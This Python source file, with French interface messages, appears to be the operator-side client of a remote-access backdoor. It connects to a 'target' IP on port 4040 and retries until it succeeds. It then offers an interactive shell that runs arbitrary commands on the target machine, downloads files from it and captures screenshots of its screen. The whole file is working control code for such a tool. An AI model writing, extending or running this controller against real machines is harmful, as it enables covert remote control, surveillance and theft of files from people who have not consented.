import time

from base import *
from commande_spliter import commande_spliter


class ClientSocket(BaseSocket):

    PORT = 4040

    def __init__(self):
        super().__init__()
        self.clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.targetaddress = (None, None)

    def connect(self, ip: str, port: int = PORT):
        i = 1
        while True:
            print('📡 Connexion au cible ' + colored_info(f'{ip}:{port} 📡'))
            try:
                self.clientsocket.connect((ip, port))
            except ConnectionRefusedError:
                print(colored_error('❌ Erreur de connexion! ❌'))
                i += 1
                print(f'🔁 Nouvelle tentative ( {i} ) 🔁')
                time.sleep(5)
            else:
                print(colored_success('\n✅ Connexion etablie avec succes ✅\n'))
                self.targetaddress = ip, port
                self.connected = True
                break

    def download_file_localy(self, commande, destination):
        splited_commande = commande_spliter(commande)
        error = False

        if destination.lower() == 'q':
            print(colored_error("‼️Le fichier n'a pas ete telecharger."))

        else:
            if already_exist(destination) == 'isdir':
                print(colored_error(f"‼️ {destination} est un dossier."))
                error = True

            elif already_exist(destination):
                print(colored_error(f'‼️ Le fichier {destination} existe dejas'))
                error = True

            else:
                self.send_header_data(commande.encode(encoding=ENCODING))
                output = self.recv_header_data(show_progress=True)

                if output == 'filenotfound'.encode(encoding=ENCODING):
                    print(colored_error("‼️ Le fichier n'existe pas."))
                elif output == 'isdir'.encode(encoding=ENCODING):
                    print(colored_error("‼️ Ne peut pas telecharger un dossier."))
                elif output == 'screenshot-error'.encode(encoding=ENCODING):
                    print(colored_error(f"‼️ Impossibe d'effectuer une capture d'ecran."))
                else:
                    with open(destination, 'wb') as f:
                        f.write(output)
                    print('Telechargement de ' + colored_info(f'{splited_commande[1]}') + ' dans ' +
                          colored_info(f'{destination}\n'))

            if error:
                new_destination = input('Entrez un nouvelle destination (ou "q" pour quitter)' + colored_info(': '))
                self.download_file_localy(commande, new_destination)

    def screenshot(self, commande, destination):
        splited_commande = commande_spliter(commande)
        if len(splited_commande) < 3:
            splited_commande.insert(1, '.screenshoot.png')

        new_commande = " ".join(splited_commande)

        self.download_file_localy(new_commande, destination)

    def run(self):
        while True:
            self.send_header_data('info'.encode(encoding=ENCODING))
            cwd = self.recv_header_data().decode(encoding=ENCODING)
            prompt = ('╭─' + colored_info(f' {self.targetaddress[0]}:{self.targetaddress[1]}') +
                      f' {cwd}' + f'\n╰─' + colored_info(' ❯ '))

            commande = ''
            while commande == '':
                commande = input(prompt)
            if commande.lower() == 'exit':
                self.send_header_data(commande.encode(encoding=ENCODING))
                break

            splited_commande = commande_spliter(commande)

            if len(splited_commande) == 3 and splited_commande[0] == 'dl':
                self.download_file_localy(commande, splited_commande[2])

            elif len(splited_commande) == 2 and splited_commande[0] == 'capture':
                self.screenshot(commande, splited_commande[1])

            else:
                self.send_header_data(commande.encode(encoding=ENCODING))
                output = self.recv_header_data(show_progress=False)
                print(output.decode(encoding=ENCODING))

        print(colored_success(colored_success(colored_success(f'\n‼️ Deconnecte\n'))))
        self.clientsocket.close()


if __name__ == '__main__':
    client = ClientSocket()
    target_ip = input("Entrez l'addresse IP du cible: ")
    client.connect(target_ip)
    client.run()
